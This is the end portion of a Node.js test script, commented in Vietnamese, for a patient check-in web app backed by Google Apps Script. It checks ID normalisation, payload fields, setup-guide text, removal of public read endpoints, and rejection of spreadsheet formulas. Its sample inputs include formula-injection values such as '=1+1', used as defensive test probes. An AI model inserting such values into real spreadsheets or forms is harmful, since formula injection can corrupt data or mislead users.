  const emoList = [...emo.matchAll(/'([^']*)'/g)].map(m => m[1]);
  T('EMOTION_LABELS trùng EMOTIONS trong script.js (9 nhãn, đúng thứ tự)', emoList.length === 9 && JSON.stringify(env.sandbox.EMOTION_LABELS) === JSON.stringify(emoList), emo);
  /* normalizePatientId hai phía phải cho cùng kết quả */
  const clientFn = (js.match(/function normalizePatientId\(raw\) \{[\s\S]*?\n\}/) || [''])[0];
  const ctx = {}; vm.createContext(ctx); vm.runInContext(clientFn, ctx);
  const samples = ['26012345', '0012345', '260 123 45', '260.123.45', '260-123-45', ' 26012345 ', '12', '123', '1'.repeat(20), '1'.repeat(21), 'HV123', '=1+1', '', null, '+260', '(26)012345', '٢٦٠', '26\u00a0012', '260\t123'];
  const diff = samples.filter(s => ctx.normalizePatientId(s) !== env.sandbox.normalizePatientId_(s));
  T('normalizePatientId (web) và normalizePatientId_ (server) giống nhau trên ' + samples.length + ' mẫu', clientFn && diff.length === 0, diff.join(', '));
  T('Tên trường gửi lên khớp hai phía: web gửi patientId, server đọc data.patientId', /patientId: payload\.patientId/.test(js) && /data\.patientId/.test(SRC) && !/\bphone:/.test(js));
}

/* ===== Nguồn: hướng dẫn cài và các chốt ===== */
T('Nguồn: hướng dẫn chỉ đúng dự án mới (Sheet bản an toàn 30-10-2026, URL AKfycbzfN8…), cập nhật Phiên bản mới giữ URL', /bản an toàn 30-10-2026/.test(SRC) && /AKfycbzfN8/.test(SRC) && /Phiên bản mới \(New version\)/.test(SRC) && /GIỮ NGUYÊN URL/.test(SRC));
T('Nguồn: BƯỚC 2 dùng hàm tạm chayThu (Apps Script giấu hàm tên kết thúc "_"), dặn xóa sau khi chạy', /function chayThu\(\) \{ test_\(\); \}/.test(SRC) && /GIẤU các hàm có tên kết thúc bằng dấu gạch dưới/.test(SRC) && /XÓA dòng  function chayThu/.test(SRC) && !/^function chayThu/m.test(SRC));
T('Nguồn: thứ tự triển khai – Apps Script TRƯỚC, web SAU (web mới gửi nhãn mới; script mới vẫn nhận web cũ, kể cả "Buồn")', /Apps Script TRƯỚC, web SAU/.test(SRC) && /BƯỚC 6 – Đưa web mới lên \(chỉ SAU khi xong BƯỚC 3/.test(SRC));
T('Nguồn: hướng dẫn chia sẻ cho bác sĩ – Hạn chế, Người xem (Ctrl+F, chế độ xem bộ lọc tạm thời, Tải xuống .xlsx), Người chỉnh sửa (bỏ chọn quyền chia sẻ, dùng chung ô B2)',
  /Quyền truy cập chung: Hạn chế/.test(SRC) && /"Người xem" \(Viewer\)/.test(SRC) && /Ctrl\+F/.test(SRC) && /Tạo chế độ xem bộ lọc\s*\*?\s*tạm thời/.test(SRC) &&
  /Tệp \(File\) → Tải xuống \(Download\) → Microsoft Excel \(\.xlsx\)/.test(SRC) && /"Người chỉnh sửa" \(Editor\)/.test(SRC) &&
  /BỎ chọn "Người chỉnh sửa có thể thay đổi quyền\s*\*?\s*và chia sẻ"/.test(SRC) && /dùng chung MỘT ô B2/.test(SRC) && /Thông báo cho mọi người/.test(SRC));
T('Nguồn: hướng dẫn nhắc Người chỉnh sửa mở được Apps Script (chỉ cấp cho người tin)', /Người chỉnh sửa của Sheet cũng mở được Tiện ích mở rộng → Apps Script/.test(SRC));
T('Nguồn: test_ dùng mã số có số 0 đầu và kiểm cột B giữ số 0', /patientId: '0012 345'/.test(SRC) && /b === '0012345'/.test(SRC));
T('Nguồn: không dùng getActiveSheet()', !/getActiveSheet\(/.test(SRC.replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, '')));
T('Nguồn: không còn ALLOW_PUBLIC_READ hay đường đọc toàn bảng', !/ALLOW_PUBLIC_READ|readAll_/.test(SRC));
T('Nguồn: không còn trả JavaScript (JSONP)', !/MimeType\.JAVASCRIPT/.test(SRC));
T('Nguồn: giữ safeText_, setNumberFormat(\'@\'), LockService', /function safeText_/.test(SRC) && /setNumberFormat\('@'\)/.test(SRC) && /LockService\.getScriptLock/.test(SRC));

/* ===== Bản cho dự án CŨ (google_apps_script-du-an-cu.js): vẫn tắt doGet và nhận app cũ ===== */
{
  const env = load({ src: SRC_OLD });
  T('Dự án cũ: file có ghi chú "CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ", không làm BƯỚC 5', /CHỈ DÀNH CHO DỰ ÁN APPS SCRIPT CŨ/.test(SRC_OLD) && /KHÔNG làm BƯỚC 5/.test(SRC_OLD));
  T('Dự án cũ: doGet trả public_read_disabled', env.G({}).getContent() === '{"result":"error","error":"public_read_disabled"}');
  const r = env.P(LEGACY);
  T('Dự án cũ: payload app cũ f76adc9 vẫn ghi được, chặn công thức', r.result === 'success' && env.P(Object.assign({}, LEGACY, { phone: '=1+1+1+1+1' })).error === 'phone_invalid' && noFormula(env.sheets.CheckIn), JSON.stringify(r));
}

console.log('\n' + passes + ' PASS, ' + fails + ' FAIL (Apps Script giả lập)');
process.exit(fails ? 1 : 0);
